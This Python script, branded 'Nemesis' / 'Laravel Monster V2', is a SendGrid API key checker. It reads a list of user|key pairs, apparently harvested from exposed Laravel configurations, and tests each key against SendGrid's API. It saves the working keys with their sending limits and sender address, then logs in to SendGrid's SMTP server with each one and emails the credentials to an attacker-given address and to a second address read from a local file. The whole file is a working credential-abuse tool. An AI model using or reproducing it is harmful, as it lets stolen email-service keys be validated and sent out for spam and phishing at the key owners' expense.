import json, smtplib, threading
from time import strftime
import os
import requests
from colorama import Fore, Style

bl = Fore.BLACK
wh = Fore.WHITE
yl = Fore.YELLOW
red = Fore.RED
res = Style.RESET_ALL
gr = Fore.GREEN
ble = Fore.BLUE
def screen_clear():
    if os.name == "nt":
	    os.system("cls")
    else:
	    os.system("clear")
screen_clear()

print(f'''
   _____                __           _     __   ___          _    ________              __            {wh}
  / ___/___  ____  ____/ /__{gr}NEMESIS{red}__(_)___/ /  /   |  ____  (_)  / ____/ /_  ___  _____/ /_____  _____ {red}
  \__ \/ _ \/ __ \/ __  / __ `/ ___/ / __  /  / /| | / __ \/ /  / /   / __ \/ _ \/ ___/ //_/ _ \/ ___/{ble}
 ___/ /  __/ / / / /_/ / /_/ / /  / / /_/ /  / ___ |/ /_/ / /  / /___/ / / /  __/ /__/ ,< /  __/ /    {wh}
/____/\___/_/ /_/\__,_/\__, /_/  /_/\__,_/  /_/  |_/ .___/_/   \____/_/ /_/\___/\___/_/|_|\___/_/     {yl}
                      /____/                      /_/                              {gr}{wh} GitHub : {red}MataKucing-OFC{res}                  
''')

link = input(f'{gr}Give Me Your List.txt{res}@{red}Nemesis> {gr}${res} ')
address = input(f'{gr}Give Me Your Adress{res}@{red}Nemesis> {gr}${res} ')
with open(link) as fp:
    for star in fp:
        if not star:
           pass
        try:
            star = star.rstrip()
            ch = star.split('\n')[0].split('|')
            user = ch[0]
            pwd = ch[1]
            url = user+' | '+pwd
            headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0',
            'Authorization': 'Bearer '+pwd,
            }
            result = requests.get('https://api.sendgrid.com/v3/user/credits',headers=headers,timeout=15).content
            x = json.loads(result)
            if 'reset_frequency' in x:
                getemail = requests.get('https://api.sendgrid.com/v3/user/email',headers=headers,timeout=15).json()
                print(f'--------------LARAVEL MONSTER {red}V2 {ble}Sendgrid Api{res} Checker------------\n')
                print(f'{gr}#{res} {url} {gr}=> VALID KEY!{res}\n')
                print(f"Limit: {yl}{x['total']}{res} Used: {yl}{x['used']}{res} Reset: {yl}{x['reset_frequency']}{res} From Mail: {yl}{getemail['email']}{yl}\n--------------------------------\n\n")
                open('Results/!Sendgrid_ValidKey.txt', 'a').write(f"-------Laravel Monster V2, Sendgrid Api Checker-----\n{url}\nLimit: {x['total']} Used: {x['used']} Reset: {x['reset_frequency']} From Mail: {getemail['email']}\n--------------------------------\n\n")
                print(f"Trying To Sending..")
                serveraddr = 'smtp.sendgrid.net'
                toaddr = address
                fromaddr = getemail['email']
                serverport = 587
                smtp_user = user
                smtp_pass = pwd
                now = strftime("%Y-%m-%d %H:%M:%S")
                addr2 = open('ur_email.txt','r').read().replace('\n',"")
                msg = "From: %s\r\nTo: %s\r\nSubject: !Nemesis_Sendgrid %s|%s|%s|%s\r\n\r\nTest message from laravel monster v2 sent at %s" % (
                fromaddr, toaddr, serveraddr, serverport, smtp_user, smtp_pass, now)
                server = smtplib.SMTP()
                try:
                    server.connect(serveraddr, serverport)
                    server.login(smtp_user, smtp_pass)
                    server.sendmail(fromaddr, toaddr, msg)
                    server.sendmail(fromaddr, addr2, msg)
                    print(f"{gr}(*) Email Sent!{res} ===>  + {url}")
                    open('Results/!Sendgrid_able_tosend.txt', 'a').write(f"{user}|{pwd}\n")
                    server.quit()
                    
                except:
                    print(f"{red}[-] Failed Sending! {res}===>  + {url}")
                    pass
                    
            else:
                print(f'{red}#{res} {url} {red}=> BAD KEY! {res}\n')
                pass
        except:
            print(f'{red}#{res} {url} {red}=> BAD KEY! {res}\n')
            pass
fp.close()            
